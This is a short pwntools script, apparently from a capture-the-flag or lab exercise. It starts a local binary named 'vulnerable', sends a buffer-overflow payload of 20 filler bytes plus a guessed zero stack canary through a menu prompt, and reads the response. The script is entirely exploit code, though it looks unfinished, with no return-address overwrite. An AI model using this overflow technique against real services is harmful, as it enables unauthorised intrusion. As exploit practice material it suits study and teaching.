from pwn import *
import time

canary_offset = 20

canary = bytes([0,0,0,0,0,0,0,0])

payload = b'A' * canary_offset + canary
 

binary_path = './vulnerable'
port = 4444

process_instance = process([binary_path, str(port)])
time.sleep(0.1)

conn = remote('localhost', port)

conn.recvuntil('Select menu > ')

conn.sendline('1')
conn.recvuntil('Message: ')

conn.send(payload)

conn.recvuntil('Select menu > ')
conn.sendline('3')

response = conn.recvall(timeout=2)
